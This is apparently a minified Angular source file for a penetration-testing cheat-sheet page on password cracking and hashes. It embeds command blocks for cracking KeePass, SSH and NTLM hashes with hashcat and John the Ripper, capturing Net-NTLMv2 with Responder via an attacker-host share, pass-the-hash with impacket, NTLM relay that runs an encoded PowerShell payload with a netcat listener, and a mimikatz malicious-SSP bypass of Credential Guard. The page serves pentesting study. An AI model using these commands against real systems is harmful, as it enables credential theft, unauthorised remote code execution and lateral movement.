import{a as _,b as M,c as P,d as v,e as T,f as O,g as R,h as E}from"./chunk-JS7EHLTA.js";import"./chunk-PVCOTGOC.js";import{$a as S,Da as a,Ea as d,F as p,Fa as m,T as i,Ta as x,Ua as w,Va as y,Ya as b,_ as u,_a as C,ca as h,ja as c,ka as n,la as t,ma as g,ta as f,ua as k,y as l}from"./chunk-G2ZLQXRG.js";function H(s,r){if(s&1&&(n(0,"a",19),a(1),n(2,"span",20),a(3,"\u203A"),t()()),s&2){let e=r.$implicit;c("routerLink",e.route)("queryParams",e.queryParams),i(),m(" ",e.label," ")}}function j(s,r){if(s&1&&(n(0,"nav",17),h(1,H,4,3,"a",18),t()),s&2){let e=k();i(),c("ngForOf",e.currentSection.links)}}function A(s,r){if(s&1&&(n(0,"mat-expansion-panel")(1,"mat-expansion-panel-header")(2,"mat-panel-title"),a(3),t()(),g(4,"app-terminal",21),t()),s&2){let e=r.$implicit;i(3),d(e.context),i(),c("command",e.command)}}var L=class s{selectedSection="methodology";sections=[{id:"methodology",label:"Methodology & Keyspace",group:"Workflow",important:!0},{id:"wordlist-mutation",label:"Wordlist Mutation Rules",group:"Workflow"},{id:"john-the-ripper",label:"John the Ripper Basics",group:"Workflow"},{id:"keepass",label:"KeePass Databases",group:"Offline Hashes"},{id:"ssh-key",label:"SSH Private Key Passphrase",group:"Offline Hashes"},{id:"ntlm-cracking",label:"NTLM / Net-NTLMv2 Cracking",group:"Windows Credentials",important:!0},{id:"pass-the-hash",label:"Pass-the-Hash & Relay",group:"Windows Credentials",important:!0},{id:"credential-guard",label:"Windows Credential Guard",group:"Windows Credentials"}];route=l(b);router=l(C);destroyRef=l(p);ngOnInit(){this.route.queryParamMap.pipe(O(this.destroyRef)).subscribe(r=>{let e=r.get("section");e&&this.sections.some(o=>o.id===e)&&(this.selectedSection=e)})}selectSection(r){this.selectedSection=r,this.router.navigate([],{relativeTo:this.route,queryParams:{section:r},replaceUrl:!0})}get currentSection(){return this.referenceSections[this.selectedSection]??this.referenceSections.methodology}referenceSections={methodology:{title:"Cracking Methodology & Keyspace",description:"Extract \u2192 identify \u2192 estimate feasibility \u2192 prepare the wordlist \u2192 attack. Estimate keyspace and hash rate before committing time to an attack.",blocks:[{context:"Methodology \xB7 1. Extract \u2192 2. Identify \u2192 3. Estimate \u2192 4. Prepare wordlist \u2192 5. Attack",command:`# Identify the hash type/format
hashid <HASH>

# Estimate keyspace and cracking time
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
python3 -c "print(62**8)"           # keyspace for an 8-char password
hashcat -b                           # benchmark CPU/GPU hash rate
python3 -c "print(916132832 / 134200000)"   # keyspace / hash-rate (CPU)

# Attack the hash
hashcat -m <HASH_TYPE> hashes.txt /usr/share/wordlists/rockyou.txt -r rules.rule`}]},"wordlist-mutation":{title:"Wordlist Mutation Rules",description:"Mutate dictionaries with Hashcat rules to satisfy password-policy constraints without hand-editing wordlists.",blocks:[{context:"Wordlist mutation rules (Hashcat)",command:`# Common rule operators: ^ prepend, $ append, c capitalize first letter
echo '$1' > demo.rule
hashcat -r demo.rule --stdout demo.txt     # preview mutated output

# Combine rules on one line (sequential) vs multiple lines (independent)
# "$1 c"  -> append number, then capitalize
# "$1\\nc" -> two separate variants

# Predefined rule sets
ls /usr/share/hashcat/rules/
hashcat -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule`}]},"john-the-ripper":{title:"John the Ripper Basics",description:"Core John the Ripper workflow: convert files to crackable hashes, auto-detect the format, crack with wordlists/rules, and manage long-running sessions.",blocks:[{context:"Convert common file types into crackable hashes",command:`zip2john file.zip > hash.txt
ssh2john id_rsa > hash.txt
keepass2john db.kdbx > hash.txt
pdf2john file.pdf > hash.txt
office2john document.docx > hash.txt
rar2john file.rar > hash.txt`},{context:"Basic cracking with a wordlist (auto-detects the hash format)",command:`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Show every password already cracked for this hash file
john --show hash.txt`},{context:"Force a specific hash format when auto-detection is ambiguous",command:`john --list=formats | grep -i <KEYWORD>     # search for a supported format name
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --format=sha256crypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`},{context:"Rule-based and incremental/mask attacks",command:`john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo hash.txt   # apply a predefined rule set
john --incremental hash.txt                                                # brute-force every character combination
john --mask='?u?l?l?l?l?d?d?d' hash.txt                                     # Capital + 4 lowercase + 3 digits`},{context:"Session management for long cracking jobs",command:`john --session=mysession --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Ctrl+C to pause, then resume later:
john --restore=mysession`}]},keepass:{title:"KeePass Databases",description:"Locate, format and crack an offline KeePass (.kdbx) vault to recover the master password.",blocks:[{context:"KeePass database cracking \xB7 Hashcat",command:`Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

keepass2john Database.kdbx > keepass.hash
hashcat --help | grep -i keepass     # mode 13400
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule`},{context:"KeePass database cracking \xB7 John the Ripper",command:`keepass2john Database.kdbx > keepass.hash
# Strip the leading "Database:" filename prefix John adds, then crack
sed -i 's/^Database://' keepass.hash
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
john --show keepass.hash`}]},"ssh-key":{title:"SSH Private Key Passphrase",description:"Recover the passphrase protecting an SSH private key to enable authentication to a remote system.",blocks:[{context:"SSH private key passphrase cracking \xB7 Hashcat",command:`ssh2john id_rsa > ssh.hash
hashcat -h | grep -i ssh
# 22911 -> OpenSSH $0$ / 22921 -> OpenSSH $6$ / 22931 -> OpenSSH $1$,$3$

hashcat -m 22921 ssh.hash wordlist.txt -r custom.rule --force`},{context:"SSH private key passphrase cracking \xB7 John the Ripper (with a custom rule)",command:`ssh2john id_rsa > ssh.hash

# Define a custom rule (e.g. capitalize + append digits/specials) and register it
cat >> ssh.rule <<'EOF'
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
EOF
sudo sh -c 'cat ssh.rule >> /etc/john/john.conf'

john --wordlist=ssh.passwords --rules=sshRules ssh.hash
john --show ssh.hash`}]},"ntlm-cracking":{title:"NTLM / Net-NTLMv2 Cracking",description:"Crack a local NTLM hash dumped from the SAM/LSASS, or capture and crack a Net-NTLMv2 challenge-response with Responder.",blocks:[{context:"Cracking NTLM / Net-NTLMv2 hashes \xB7 Hashcat",command:`# Local NTLM hash (e.g. dumped via Mimikatz lsadump::sam)
echo <NTLM_HASH> > user.hash
hashcat --help | grep -i ntlm         # NTLM mode 1000
hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Net-NTLMv2 captured with Responder
sudo responder -I <INTERFACE>
# Trigger auth from the target: dir \\\\<ATTACKER_IP>\\share
# Save the full "NTLMv2-SSP Hash" line to user.hash
hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt`},{context:"Cracking NTLM / Net-NTLMv2 hashes \xB7 John the Ripper",command:`# Local NTLM hash
echo <NTLM_HASH> > user.hash
john --format=NT user.hash --wordlist=/usr/share/wordlists/rockyou.txt
john --show --format=NT user.hash

# Net-NTLMv2 hash captured with Responder (format: user::DOMAIN:challenge:response:blob)
john --format=netntlmv2 user.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Domain cached credentials (MSCACHEV2 / mscash2, e.g. from an offline SAM/registry dump)
john --wordlist=/usr/share/wordlists/rockyou.txt --format=mscash2 hash.txt`}]},"pass-the-hash":{title:"Pass-the-Hash & Relay",description:"Reuse a captured NTLM hash directly, or relay an in-flight Net-NTLMv2 authentication, without ever cracking the password.",blocks:[{context:"Pass-the-Hash (NTLM, no cracking required)",command:`smbclient \\\\\\\\<TARGET_IP>\\\\share -U Administrator --pw-nt-hash <NTLM_HASH>

impacket-psexec -hashes <LMHASH>:<NTHASH> <USER>@<TARGET_IP>
impacket-wmiexec -hashes <LMHASH>:<NTHASH> <USER>@<TARGET_IP>`},{context:"Relaying Net-NTLMv2 (ntlmrelayx)",command:`impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c "powershell -enc <BASE64_PAYLOAD>"

# Catch the result
nc -nvlp <PORT>
# Trigger auth from the victim: dir \\\\<ATTACKER_IP>\\share`}]},"credential-guard":{title:"Windows Credential Guard",description:"Credential Guard isolates domain hashes from LSASS in VTL1, blocking direct Mimikatz extraction; a malicious SSP can still capture plaintext credentials on the next logon.",blocks:[{context:"Windows Credential Guard (bypass + limitations)",command:`Get-ComputerInfo | Select-String 'CredentialGuard|DeviceGuard'
# When enabled, LSASS no longer exposes plaintext-recoverable domain hashes (isolated in VTL1 / LSAISO)

# Bypass: inject a malicious SSP to capture plaintext credentials on next logon
privilege::debug
misc::memssp
type C:\\Windows\\System32\\mimilsa.log`}]}};static \u0275fac=function(e){return new(e||s)};static \u0275cmp=u({type:s,selectors:[["app-password-cracking"]],decls:27,vars:7,consts:[[1,"password-cracking-page"],[1,"page-header"],[1,"terminal-path"],[1,"prompt"],[1,"title"],[1,"page-description"],[1,"section-workspace"],[1,"section-workspace__index",3,"sectionChange","items","activeId"],[1,"section-workspace__content"],["aria-labelledby","password-cracking-section-title",1,"reference-section"],[1,"reference-section__heading"],[1,"section-kicker"],["id","password-cracking-section-title"],[1,"reference-section__count"],["class","reference-links","aria-label","Related guides",4,"ngIf"],["multi",""],[4,"ngFor","ngForOf"],["aria-label","Related guides",1,"reference-links"],[3,"routerLink","queryParams",4,"ngFor","ngForOf"],[3,"routerLink","queryParams"],["aria-hidden","true"],[3,"command"]],template:function(e,o){e&1&&(n(0,"div",0)(1,"header",1)(2,"div",2)(3,"span",3),a(4,"~/get.sh/"),t(),a(5,"password-cracking"),t(),n(6,"h1",4),a(7,"Password Cracking & Hashes"),t(),n(8,"p",5),a(9,"Offline hash cracking methodology, wordlist mutation and NTLM capture/pass/relay workflows."),t()(),n(10,"div",6)(11,"app-section-index",7),f("sectionChange",function(N){return o.selectSection(N)}),t(),n(12,"div",8)(13,"section",9)(14,"div",10)(15,"div")(16,"span",11),a(17,"REFERENCE"),t(),n(18,"h2",12),a(19),t(),n(20,"p"),a(21),t()(),n(22,"span",13),a(23),t()(),h(24,j,2,1,"nav",14),n(25,"mat-accordion",15),h(26,A,5,2,"mat-expansion-panel",16),t()()()()()),e&2&&(i(11),c("items",o.sections)("activeId",o.selectedSection),i(8),d(o.currentSection.title),i(2),d(o.currentSection.description),i(2),m("",o.currentSection.blocks.length," BLOCKS"),i(),c("ngIf",o.currentSection.links==null?null:o.currentSection.links.length),i(2),c("ngForOf",o.currentSection.blocks))},dependencies:[y,x,w,T,v,_,M,P,R,E,S],styles:[".password-cracking-page[_ngcontent-%COMP%]{padding:2rem 0;color:#e5edf0}.page-header[_ngcontent-%COMP%]{margin-bottom:2rem}.terminal-path[_ngcontent-%COMP%]{margin-bottom:.5rem;color:#aebbc1;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:.8rem}.terminal-path[_ngcontent-%COMP%]   .prompt[_ngcontent-%COMP%]{color:#78d6cd}.title[_ngcontent-%COMP%]{margin:0 0 .45rem;color:#f5f8f9;font-size:1.9rem;font-weight:700}.page-description[_ngcontent-%COMP%], .reference-section__heading[_ngcontent-%COMP%]   p[_ngcontent-%COMP%]{margin:0;color:#b4c0c6;font-size:.9rem;line-height:1.6}.reference-section__heading[_ngcontent-%COMP%]{display:flex;align-items:end;justify-content:space-between;gap:1rem;margin-bottom:1rem;padding-bottom:1rem;border-bottom:1px solid #29383d}.section-kicker[_ngcontent-%COMP%]{color:#78d6cd;font-size:.65rem;font-weight:700;letter-spacing:.1em}.reference-section__heading[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:.25rem 0 .35rem;color:#f1f6f7;font-size:1.35rem;font-weight:650}.reference-section__count[_ngcontent-%COMP%]{flex:0 0 auto;color:#b4c0c6;font-size:.68rem;font-weight:700;letter-spacing:.07em}.reference-section[_ngcontent-%COMP%]   mat-expansion-panel[_ngcontent-%COMP%]{margin-bottom:.55rem;background:#111b1f;border:1px solid #2b3c41;border-radius:7px;box-shadow:none}.reference-section[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{min-height:3.25rem;padding:0 1rem}.reference-section[_ngcontent-%COMP%]   mat-panel-title[_ngcontent-%COMP%]{color:#e5edf0;font-size:.9rem;font-weight:600}.reference-links[_ngcontent-%COMP%]{display:flex;flex-direction:column;gap:.45rem;margin:.5rem 0 1rem}.reference-links[_ngcontent-%COMP%]   a[_ngcontent-%COMP%]{display:flex;align-items:center;justify-content:space-between;gap:.75rem;padding:.75rem .85rem;color:#dce8e9;background:#111c20;border:1px solid #2b3c41;border-radius:6px;font-size:.84rem;text-decoration:none}.reference-links[_ngcontent-%COMP%]   a[_ngcontent-%COMP%]:hover, .reference-links[_ngcontent-%COMP%]   a[_ngcontent-%COMP%]:focus-visible{color:#c8f2ff;border-color:#67c9f9;outline:none;box-shadow:0 0 12px #4ebeff1f}@media(max-width:768px){.password-cracking-page[_ngcontent-%COMP%]{padding:1rem 0}.reference-section__heading[_ngcontent-%COMP%]{align-items:flex-start;flex-direction:column;gap:.6rem}.reference-section[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{padding:0 .75rem}}"]})};export{L as PasswordCrackingComponent};
